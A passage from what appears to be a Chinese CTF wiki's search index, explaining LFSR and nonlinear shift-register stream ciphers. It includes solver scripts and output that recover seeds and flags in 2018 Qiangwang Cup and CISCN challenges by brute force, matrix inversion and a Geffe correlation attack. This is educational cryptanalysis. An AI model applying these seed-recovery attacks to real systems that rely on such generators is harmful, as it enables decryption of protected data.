( M ) num = int ( '' . join ( map ( str , list ( M . solve_left ( vec )))), 2 ) print hex ( num ) \u8fd0\u884c\u811a\u672c \u279c 2018 -CISCN-start-oldstreamgame git: ( master ) \u2717 sage exp.sage 32 0x926201d7 \u4ece\u800c flag \u4e3a flag{926201d7}\u3002 \u8fd8\u6709\u4e00\u79cd\u505a\u6cd5\u662f TokyoWesterns \u7684\uff0c\u53ef\u4ee5\u53c2\u8003\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\u7684\u6587\u4ef6\u3002 \u9898\u76ee \u00b6 \u53c2\u8003\u6587\u732e \u00b6 \u5bc6\u7801\u5b66\u8bb2\u4e49\uff0c\u674e\u8d85\uff0c\u5c48\u9f99\u6c5f\u7f16\u8457","title":"\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668 - LFSR"},{"location":"crypto/streamcipher/fsr/lfsr/#-lfsr","text":"","title":"\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668 - LFSR"},{"location":"crypto/streamcipher/fsr/lfsr/#_1","text":"\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u53cd\u9988\u51fd\u6570\u4e00\u822c\u5982\u4e0b a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j} a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j} \u5176\u4e2d\uff0c c_j c_j \u5747\u5728\u67d0\u4e2a\u6709\u9650\u57df F_q F_q \u4e2d\u3002 \u65e2\u7136\u7ebf\u6027\u7a7a\u95f4\u662f\u4e00\u4e2a\u7ebf\u6027\u53d8\u6362\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u77e5\u8fd9\u4e2a\u7ebf\u6027\u53d8\u6362\u4e3a \\begin{align*} &\\left[ a_{i+1},a_{i+2},a_{i+3}, ...,a_{i+n} \\right]\\\\\\\\=&\\left[ a_{i},a_{i+1},a_{i+2}, ...,a_{i+n-1} \\right]\\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right]\\\\\\\\=&\\left[ a_{0},a_{1},a_{2}, ...,a_{n-1} \\right]\\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right]^{i+1} \\end{align*} \\begin{align*} &\\left[ a_{i+1},a_{i+2},a_{i+3}, ...,a_{i+n} \\right]\\\\\\\\=&\\left[ a_{i},a_{i+1},a_{i+2}, ...,a_{i+n-1} \\right]\\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right]\\\\\\\\=&\\left[ a_{0},a_{1},a_{2}, ...,a_{n-1} \\right]\\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right]^{i+1} \\end{align*} \u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u5176\u7279\u5f81\u591a\u9879\u5f0f\u4e3a f(x)=x^n-\\sum\\limits_{i=1}^{n}c_ix^{n-i} f(x)=x^n-\\sum\\limits_{i=1}^{n}c_ix^{n-i} \u540c\u65f6\uff0c\u6211\u4eec\u5b9a\u4e49\u5176\u4e92\u53cd\u591a\u9879\u5f0f\u4e3a \\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i} \\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i} \u6211\u4eec\u4e5f\u79f0\u4e92\u53cd\u591a\u9879\u5f0f\u4e3a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u8054\u7ed3\u591a\u9879\u5f0f\u3002 \u8fd9\u91cc\u6709\u4e00\u4e9b\u5b9a\u7406\u9700\u8981\u6211\u4eec\u8bb0\u4e00\u4e0b\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002","title":"\u4ecb\u7ecd"},{"location":"crypto/streamcipher/fsr/lfsr/#_2","text":"\u5df2\u77e5\u67d0\u4e2a n \u7ea7\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u7279\u5f81\u591a\u9879\u5f0f\uff0c\u90a3\u4e48\u8be5\u5e8f\u5217\u5bf9\u5e94\u7684\u751f\u6210\u51fd\u6570\u4e3a A(x)=\\frac{p(x)}{\\overline f(x)} A(x)=\\frac{p(x)}{\\overline f(x)} \u5176\u4e2d\uff0c p(x)=\\sum\\limits_{i=1}^{n}(c_{n-i}x^{n-i}\\sum\\limits_{j=1}^{i}a_jx^{j-1}) p(x)=\\sum\\limits_{i=1}^{n}(c_{n-i}x^{n-i}\\sum\\limits_{j=1}^{i}a_jx^{j-1}) \u3002\u53ef\u4ee5\u770b\u51fa p(x) \u5b8c\u5168\u7531\u521d\u59cb\u72b6\u6001\u548c\u53cd\u9988\u51fd\u6570\u7684\u7cfb\u6570\u51b3\u5b9a\u3002","title":"\u7279\u5f81\u591a\u9879\u5f0f\u4e0e\u751f\u6210\u51fd\u6570"},{"location":"crypto/streamcipher/fsr/lfsr/#_3","text":"\u5e8f\u5217\u7684\u7684\u5468\u671f\u4e3a\u5176\u751f\u6210\u51fd\u6570\u7684\u65e2\u7ea6\u771f\u5206\u5f0f\u7684\u5206\u6bcd\u7684\u5468\u671f\u3002 \u5bf9\u4e8e n \u7ea7\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u6700\u957f\u5468\u671f\u4e3a 2^{n}-1 2^{n}-1 \uff08\u6392\u9664\u5168\u96f6\uff09\u3002\u8fbe\u5230\u6700\u957f\u5468\u671f\u7684\u5e8f\u5217\u4e00\u822c\u79f0\u4e3a m \u5e8f\u5217\u3002","title":"\u5e8f\u5217\u5468\u671f\u4e0e\u751f\u6210\u51fd\u6570"},{"location":"crypto/streamcipher/fsr/lfsr/#_4","text":"\u5c06\u4e24\u4e2a\u5e8f\u5217\u7d2f\u52a0\u5f97\u5230\u65b0\u7684\u5e8f\u5217\u7684\u5468\u671f\u4e3a\u8fd9\u4e24\u4e2a\u5e8f\u5217\u7684\u5468\u671f\u7684\u548c\u3002 \u5e8f\u5217\u662f n \u7ea7 m \u5e8f\u5217\uff0c\u5f53\u4e14\u4ec5\u5f53\u5e8f\u5217\u7684\u6781\u5c0f\u591a\u9879\u5f0f\u662f n \u6b21\u672c\u539f\u591a\u9879\u5f0f\u3002","title":"\u7279\u6b8a\u6027\u8d28"},{"location":"crypto/streamcipher/fsr/lfsr/#b-m","text":"\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u4e24\u79cd\u89d2\u5ea6\u6765\u8003\u8651 LFSR \u5bc6\u94a5\u751f\u6210\u89d2\u5ea6\uff0c\u4e00\u822c\u6211\u4eec\u5e0c\u671b\u4f7f\u7528\u7ea7\u6570\u5c3d\u53ef\u80fd\u4f4e\u7684 LFSR \u6765\u751f\u6210\u5468\u671f\u5927\uff0c\u968f\u673a\u6027\u597d\u7684\u5e8f\u5217\u3002 \u5bc6\u7801\u5206\u6790\u89d2\u5ea6\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u957f\u5ea6\u4e3a n \u7684\u5e8f\u5217 a\uff0c\u5982\u4f55\u6784\u9020\u4e00\u4e2a\u7ea7\u6570\u5c3d\u53ef\u80fd\u5c0f\u7684 LFSR \u6765\u751f\u6210\u5b83\u3002\u5176\u5b9e\u8fd9\u5c31\u662f B-M \u7b97\u6cd5\u7684\u6765\u6e90\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u5e8f\u5217\u7684\u7ebf\u6027\u590d\u6742\u5ea6\u5982\u4e0b \u82e5 s \u4e3a\u4e00\u4e2a\u5168\u96f6\u5e8f\u5217\uff0c\u5219\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a0\u3002 \u82e5\u6ca1\u6709 LFSR \u80fd\u751f\u6210 s\uff0c\u5219\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a\u65e0\u7a77\u3002 \u5426\u5219\uff0cs \u7684\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a\u751f\u6210 L(s) \u7684\u6700\u5c0f\u7ea7\u7684 LFSR\u3002 BM \u7b97\u6cd5\u7684\u8981\u6c42\u6211\u4eec\u9700\u8981\u77e5\u9053\u957f\u5ea6\u4e3a 2n \u7684\u5e8f\u5217\u3002\u5176\u590d\u6742\u5ea6 \u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n^2) \u6b21\u6bd4\u7279\u64cd\u4f5c \u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(n) \u6bd4\u7279\u3002 \u5173\u4e8e BM \u7b97\u6cd5\u7684\u7ec6\u8282\uff0c\u540e\u7eed\u6dfb\u52a0\uff0c\u76ee\u524d\u5904\u4e8e\u5b66\u4e60\u8fc7\u7a0b\u4e2d\u3002 \u4f46\u662f\u5176\u5b9e\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u957f\u5ea6\u4e3a 2n \u7684\u5e8f\u5217\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4e00\u79cd\u6bd4\u8f83\u7b28\u7684\u65b9\u6cd5\u6765\u83b7\u53d6\u539f\u5148\u7684\u5e8f\u5217\u3002\u4e0d\u59a8\u5047\u8bbe\u5df2\u77e5\u7684\u5e8f\u5217\u4e3a a_1,...,a_{2n} a_1,...,a_{2n} \uff0c\u6211\u4eec\u53ef\u4ee5\u4ee4 S_1=(a_1,...,a_n) S_1=(a_1,...,a_n) S_2=(a_2,...,a_{n+1}) S_2=(a_2,...,a_{n+1}) .... S_{n+1}=(a_{n+1},...,a_{2n}) S_{n+1}=(a_{n+1},...,a_{2n}) \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u77e9\u9635 X=(S_1,...,S_n) X=(S_1,...,S_n) \uff0c\u90a3\u4e48 S_{n+1}=(c_n,...,c_1)X S_{n+1}=(c_n,...,c_1)X \u6240\u4ee5 (c_n,...,c_1)=S_{n+1}X^{-1} (c_n,...,c_1)=S_{n+1}X^{-1} \u8fdb\u800c\u6211\u4eec\u4e5f\u5c31\u77e5\u9053\u4e86 LFSR \u7684\u53cd\u9988\u8868\u8fbe\u5f0f\uff0c\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u63a8\u51fa\u521d\u59cb\u5316\u79cd\u5b50\u3002","title":"B-M \u7b97\u6cd5"},{"location":"crypto/streamcipher/fsr/lfsr/#2018-streamgame1","text":"\u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee from flag import flag assert flag . startswith ( \"flag{\" ) assert flag . endswith ( \"}\" ) assert len ( flag ) == 25 def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) R = int ( flag [ 5 : - 1 ], 2 ) mask = 0b1010011000100011100 f = open ( \"key\" , \"ab\" ) for i in range ( 12 ): tmp = 0 for j in range ( 8 ): ( R , out ) = lfsr ( R , mask ) tmp = ( tmp << 1 ) ^ out f . write ( chr ( tmp )) f . close () \u53ef\u4ee5\u53d1\u73b0\uff0cflag \u7684\u957f\u5ea6\u4e3a25-5-1=19\uff0c\u6240\u4ee5\u53ef\u4ee5\u66b4\u529b\u679a\u4e3e\u3002\u7ed3\u679c \u279c 2018 -\u5f3a\u7f51\u676f-streamgame1 git: ( master ) \u2717 python exp.py 12 0b1110101100001101011 \u56e0\u6b64 flag \u4e3a flag{1110101100001101011}\u3002","title":"2018 \u5f3a\u7f51\u676f streamgame1"},{"location":"crypto/streamcipher/fsr/lfsr/#2018-ciscn-oldstreamgame","text":"\u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee flag = \"flag{xxxxxxxxxxxxxxxx}\" assert flag.startswith ( \"flag{\" ) assert flag.endswith ( \"}\" ) assert len ( flag )== 14 def lfsr ( R,mask ) : output = ( R << 1) & 0xffffffff i=(R&mask)&0xffffffff lastbit=0 while i!=0: lastbit^=(i&1 ) i = i>>1 output^ = lastbit return ( output,lastbit ) R = int ( flag [ 5 :-1 ] ,16 ) mask = 0b10100100000010000000100010010100 f = open ( \"key\" , \"w\" ) for i in range ( 100 ) : tmp = 0 for j in range ( 8 ) : ( R,out )= lfsr ( R,mask ) tmp =( tmp << 1 ) ^out f.write ( chr ( tmp )) f.close () \u7a0b\u5e8f\u5f88\u7b80\u5355\uff0c\u4ecd\u7136\u662f\u4e00\u4e2a LFSR\uff0c\u4f46\u662f\u521d\u6001\u662f 32 \u6bd4\u7279\u4f4d\uff0c\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u9009\u62e9\u7206\u7834\uff0c\u4f46\u662f\u8fd9\u91cc\u4e0d\u9009\u62e9\u7206\u7834\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e24\u79cd\u505a\u6cd5\u3002 \u7b2c\u4e00\u79cd\u505a\u6cd5\uff0c\u7a0b\u5e8f\u8f93\u51fa\u7684\u7b2c 32 \u4e2a\u6bd4\u7279\u662f\u7531\u7a0b\u5e8f\u8f93\u51fa\u7684\u524d 31 \u4e2a\u6bd4\u7279\u548c\u521d\u59cb\u79cd\u5b50\u7684\u7b2c 1 \u4e2a\u6bd4\u7279\u6765\u51b3\u5b9a\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u521d\u59cb\u79cd\u5b50\u7684\u7b2c\u4e00\u4e2a\u6bd4\u7279\uff0c\u8fdb\u800c\u53ef\u4ee5\u77e5\u9053\u521d\u59cb\u79cd\u5b50\u7684\u7b2c 2 \u4e2a\u6bd4\u7279\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002\u4ee3\u7801\u5982\u4e0b mask = 0b10100100000010000000100010010100 b = '' N = 32 with open ( 'key' , 'rb' ) as f : b = f . read () key = '' for i in range ( N / 8 ): t = ord ( b [ i ]) for j in xrange ( 7 , - 1 , - 1 ): key += str ( t >> j & 1 ) idx = 0 ans = \"\" key = key [ 31 ] + key [: 32 ] while idx < 32 : tmp = 0 for i in range ( 32 ): if mask >> i & 1 : tmp ^= int ( key [ 31 - i ]) ans = str ( tmp ) + ans idx += 1 key = key [ 31 ] + str ( tmp ) + key [ 1 : 31 ] num = int ( ans , 2 ) print hex ( num ) \u8fd0\u884c \u279c 2018 -CISCN-start-oldstreamgame git: ( master ) \u2717 python exp1.py 0x926201d7 \u7b2c\u4e8c\u79cd\u505a\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e00\u4e0b\u77e9\u9635\u8f6c\u6362\u7684\u8fc7\u7a0b\uff0c\u5982\u679c\u8fdb\u884c\u4e86 32 \u6b21\u7ebf\u6027\u53d8\u6362\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u8f93\u51fa\u6d41\u524d 32 \u4e2a\u6bd4\u7279\u3002\u800c\u5176\u5b9e\uff0c\u6211\u4eec\u53ea\u9700\u8981\u524d 32 \u4e2a\u6bd4\u7279\u5c31\u53ef\u4ee5\u6062\u590d\u521d\u59cb\u72b6\u6001\u4e86\u3002 mask = 0b10100100000010000000100010010100 N = 32 F = GF ( 2 ) b = '' with open ( 'key' , 'rb' ) as f : b = f . read () R = [ vector ( F , N ) for i in range ( N )] for i in range ( N ): R [ i ][ N - 1 ] = mask >> ( 31 - i ) & 1 for i in range ( N - 1 ): R [ i + 1 ][ i ] = 1 M = Matrix ( F , R ) M = M ^ N vec = vector ( F , N ) row = 0 for i in range ( N / 8 ): t = ord ( b [ i ]) for j in xrange ( 7 , - 1 , - 1 ): vec [ row ] = t >> j & 1 row += 1 print rank ( M ) num = int ( '' . join ( map ( str , list ( M . solve_left ( vec )))), 2 ) print hex ( num ) \u8fd0\u884c\u811a\u672c \u279c 2018 -CISCN-start-oldstreamgame git: ( master ) \u2717 sage exp.sage 32 0x926201d7 \u4ece\u800c flag \u4e3a flag{926201d7}\u3002 \u8fd8\u6709\u4e00\u79cd\u505a\u6cd5\u662f TokyoWesterns \u7684\uff0c\u53ef\u4ee5\u53c2\u8003\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\u7684\u6587\u4ef6\u3002","title":"2018 CISCN \u521d\u8d5b oldstreamgame"},{"location":"crypto/streamcipher/fsr/lfsr/#_5","text":"","title":"\u9898\u76ee"},{"location":"crypto/streamcipher/fsr/lfsr/#_6","text":"\u5bc6\u7801\u5b66\u8bb2\u4e49\uff0c\u674e\u8d85\uff0c\u5c48\u9f99\u6c5f\u7f16\u8457","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/streamcipher/fsr/nfsr/","text":"\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668 \u00b6 \u4ecb\u7ecd \u00b6 \u4e3a\u4e86\u4f7f\u5f97\u5bc6\u94a5\u6d41\u8f93\u51fa\u7684\u5e8f\u5217\u5c3d\u53ef\u80fd\u590d\u6742\uff0c\u4f1a\u4f7f\u7528\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u5e38\u89c1\u7684\u6709\u4e09\u79cd \u975e\u7ebf\u6027\u7ec4\u5408\u751f\u6210\u5668\uff0c\u5bf9\u591a\u4e2a LFSR \u7684\u8f93\u51fa\u4f7f\u7528\u4e00\u4e2a\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570 \u975e\u7ebf\u6027\u6ee4\u6ce2\u751f\u6210\u5668\uff0c\u5bf9\u4e00\u4e2a LFSR \u7684\u5185\u5bb9\u4f7f\u7528\u4e00\u4e2a\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570 \u949f\u63a7\u751f\u6210\u5668\uff0c\u4f7f\u7528\u4e00\u4e2a\uff08\u6216\u591a\u4e2a\uff09LFSR \u7684\u8f93\u51fa\u6765\u63a7\u5236\u53e6\u4e00\u4e2a\uff08\u6216\u591a\u4e2a\uff09LFSR \u7684\u65f6\u949f \u975e\u7ebf\u6027\u7ec4\u5408\u751f\u6210\u5668 \u00b6 \u7b80\u4ecb \u00b6 \u7ec4\u5408\u751f\u6210\u5668\u4e00\u822c\u5982\u4e0b\u56fe\u6240\u793a\u3002 Geffe \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 Geffe \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002Geffe \u5305\u542b 3 \u4e2a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570\u4e3a F(x_1,x_2,x_3)=(x_1 \\and x_2) \\oplus (\\urcorner x_1 \\and x_3)=(x_1 \\and x_2) \\oplus ( x_1 \\and x_3)\\oplus x_3 F(x_1,x_2,x_3)=(x_1 \\and x_2) \\oplus (\\urcorner x_1 \\and x_3)=(x_1 \\and x_2) \\oplus ( x_1 \\and x_3)\\oplus x_3 2018 \u5f3a\u7f51\u676f streamgame3 \u00b6 \u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee from flag import flag assert flag . startswith ( \"flag{\" ) assert flag . endswith ( \"}\" ) assert len ( flag ) == 24 def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) def single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ): ( R1_NEW , x1 ) = lfsr ( R1 , R1_mask ) ( R2_NEW , x2 ) = lfsr ( R2 , R2_mask ) ( R3_NEW , x3 ) = lfsr ( R3 , R3_mask ) return ( R1_NEW , R2_NEW , R3_NEW ,( x1 * x2 ) ^ (( x2 ^ 1 ) * x3 )) R1 = int ( flag [ 5 : 11 ], 16 ) R2 = int ( flag [ 11 : 17 ], 16 ) R3 = int ( flag [ 17 : 23 ], 16 ) assert len ( bin ( R1 )[ 2 :]) == 17 assert len ( bin ( R2 )[ 2 :]) == 19 assert len ( bin ( R3 )[ 2 :]) == 21 R1_mask = 0x10020 R2_mask = 0x4100c R3_mask = 0x100002 for fi in range ( 1024 ): print fi tmp1mb = \"\" for i in range ( 1024 ): tmp1kb = \"\" for j in range ( 1024 ): tmp = 0 for k in range ( 8 ): ( R1 , R2 , R3 , out ) = single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ) tmp = ( tmp << 1 ) ^ out tmp1kb += chr ( tmp ) tmp1mb += tmp1kb f = open ( \"./output/\" + str ( fi ), \"ab\" ) f . write ( tmp1mb ) f . close () \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u4e0e Geffe \u751f\u6210\u5668\u975e\u5e38\u7c7b\u4f3c\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u76f8\u5173\u653b\u51fb\u65b9\u6cd5\u8fdb\u884c\u653b\u51fb\uff0c\u6211\u4eec\u53ef\u4ee5\u7edf\u8ba1\u4e00\u4e0b\u5728\u4e09\u4e2a LFSR \u8f93\u51fa\u4e0d\u540c\u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u540e\u7c7b Geffe \u751f\u6210\u5668\u7684\u8f93\u51fa\uff0c\u5982\u4e0b x_1 x_1 x_2 x_2 x_3 x_3 F(x_1,x_2,x_3) F(x_1,x_2,x_3) 0 0 0 0 0 0 1 1 0 1 0 0 0 1 1 0 1 0 0 0 1 0 1 1 1 1 0 1 1 1 1 1 \u53ef\u4ee5\u53d1\u73b0 Geffe \u7684\u8f93\u51fa\u4e0e x_1 x_1 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.75 Geffe \u7684\u8f93\u51fa\u4e0e x_2 x_2 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.5 Geffe \u7684\u8f93\u51fa\u4e0e x_3 x_3 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.75 \u8fd9\u8bf4\u660e\u8f93\u51fa\u4e0e\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e09\u4e2a\u7684\u5173\u8054\u6027\u975e\u5e38\u5927\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u66b4\u529b\u53bb\u679a\u4e3e\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e09\u4e2a LFSR \u7684\u8f93\u51fa\u5224\u65ad\u5176\u4e0e \u7c7b Geffe \u7684\u8f93\u51fa\u76f8\u7b49\u7684\u4e2a\u6570\uff0c\u5982\u679c\u5927\u7ea6\u5728 75% \u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u662f\u6b63\u786e\u7684\u3002\u7b2c\u4e8c\u4e2a\u5c31\u76f4\u63a5\u66b4\u529b\u679a\u4e3e\u4e86\u3002 \u811a\u672c\u5982\u4e0b #for x1 in range(2): # for x2 in range(2): # for x3 in range(2): # print x1,x2,x3,(x1*x2)^((x2^1)*x3) #n = [17,19,21] #cycle = 1 #for i in n: # cycle = cycle*(pow(2,i)-1) #print cycle def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) def single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ): ( R1_NEW , x1 ) = lfsr ( R1 , R1_mask ) ( R2_NEW , x2 ) = lfsr ( R2 , R2_mask ) ( R3_NEW , x3 ) = lfsr ( R3 , R3_mask ) return ( R1_NEW , R2_NEW , R3_NEW , ( x1 * x2 ) ^ (( x2 ^ 1 ) * x3 )) R1_mask = 0x10020 R2_mask = 0x4100c R3_mask = 0x100002 n3 = 21 n2 = 19 n1 = 17 def guess ( beg , end , num , mask ): ansn = range ( beg , end ) data = open ( './output/0' ) . read ( num ) data = '' . join ( bin ( 256 + ord ( c ))[ 3 :] for c in data ) now = 0 res = 0 for i in ansn : r = i cnt = 0 for j in range ( num * 8 ): r , lastbit = lfsr ( r , mask ) lastbit = str ( lastbit ) cnt += ( lastbit == data [ j ]) if cnt > now : now = cnt res = i print now , res return res def bruteforce2 ( x , z ): data = open ( './output/0' ) . read ( 50 ) data = '' . join ( bin ( 256 + ord ( c ))[ 3 :] for c in data ) for y in range ( pow ( 2 , n2 - 1 ), pow ( 2 , n2 )): R1 , R2 , R3 = x , y , z flag = True for i in range ( len ( data )): ( R1 , R2 , R3 , out ) = single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ) if str ( out ) != data [ i ]: flag = False break if y % 10000 == 0 : print 'now: ' , x , y , z if flag : print 'ans: ' , hex ( x )[ 2 :], hex ( y )[ 2 :], hex ( z )[ 2 :] break R1 = guess ( pow ( 2 , n1 - 1 ), pow ( 2 , n1 ), 40 , R1_mask ) print R1 R3 = guess ( pow ( 2 , n3 - 1 ), pow ( 2 , n3 ), 40 , R3_mask ) print R3 R1 = 113099 R3 = 1487603 bruteforce2 ( R1 , R3 ) \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b \u279c 2018 -CISCN-start-streamgame3 git: ( master ) \u2717 python exp.py 161 65536 172 65538 189 65545 203 65661 210 109191 242 113099 113099 157 1048576 165 1048578 183 1048580 184 1049136 186 1049436 187 1049964 189 1050869 190 1051389 192 1051836 194 1053573 195 1055799 203 1060961 205 1195773 212 1226461 213 1317459 219 1481465 239 1487603 1487603 now: 113099 270000 1487603 now: 113099 280000 1487603 now: 113099 290000 1487603 now: 113099 300000 1487603 now: 113099 310000 1487603 now: 113099 320000 1487603 now: 113099 330000 1487603 now: 113099 340000 1487603 now: 113099 350000 1487603 now: 113099 360000 1487603 ans: 1b9cb 5979c 16b2f3 \u4ece\u800c flag \u4e3a flag{01b9cb05979c16b2f3}\u3002 \u9898\u76ee \u00b6 2017 WHCTF Bornpig 2018 Google CTF 2018 Betterzip \u53c2\u8003 \u00b6 https://www.rocq.inria.fr/secret/Anne.Canteaut/MPRI/chapter3.pdf http://data.at.preempted.net/INDEX/articles/Correlation_Attacks_Geffe.pdf","title":"\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668"},{"location":"crypto/streamcipher/fsr/nfsr/#_1","text":"","title":"\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668"},{"location":"crypto/streamcipher/fsr/nfsr/#_2","text":"\u4e3a\u4e86\u4f7f\u5f97\u5bc6\u94a5\u6d41\u8f93\u51fa\u7684\u5e8f\u5217\u5c3d\u53ef\u80fd\u590d\u6742\uff0c\u4f1a\u4f7f\u7528\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u5e38\u89c1\u7684\u6709\u4e09\u79cd \u975e\u7ebf\u6027\u7ec4\u5408\u751f\u6210\u5668\uff0c\u5bf9\u591a\u4e2a LFSR \u7684\u8f93\u51fa\u4f7f\u7528\u4e00\u4e2a\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570 \u975e\u7ebf\u6027\u6ee4\u6ce2\u751f\u6210\u5668\uff0c\u5bf9\u4e00\u4e2a LFSR \u7684\u5185\u5bb9\u4f7f\u7528\u4e00\u4e2a\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570 \u949f\u63a7\u751f\u6210\u5668\uff0c\u4f7f\u7528\u4e00\u4e2a\uff08\u6216\u591a\u4e2a\uff09LFSR \u7684\u8f93\u51fa\u6765\u63a7\u5236\u53e6\u4e00\u4e2a\uff08\u6216\u591a\u4e2a\uff09LFSR \u7684\u65f6\u949f","title":"\u4ecb\u7ecd"},{"location":"crypto/streamcipher/fsr/nfsr/#_3","text":"","title":"\u975e\u7ebf\u6027\u7ec4\u5408\u751f\u6210\u5668"},{"location":"crypto/streamcipher/fsr/nfsr/#_4","text":"\u7ec4\u5408\u751f\u6210\u5668\u4e00\u822c\u5982\u4e0b\u56fe\u6240\u793a\u3002","title":"\u7b80\u4ecb"},{"location":"crypto/streamcipher/fsr/nfsr/#geffe","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 Geffe \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002Geffe \u5305\u542b 3 \u4e2a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u975e\u7ebf\u6027\u7ec4\u5408\u51fd\u6570\u4e3a F(x_1,x_2,x_3)=(x_1 \\and x_2) \\oplus (\\urcorner x_1 \\and 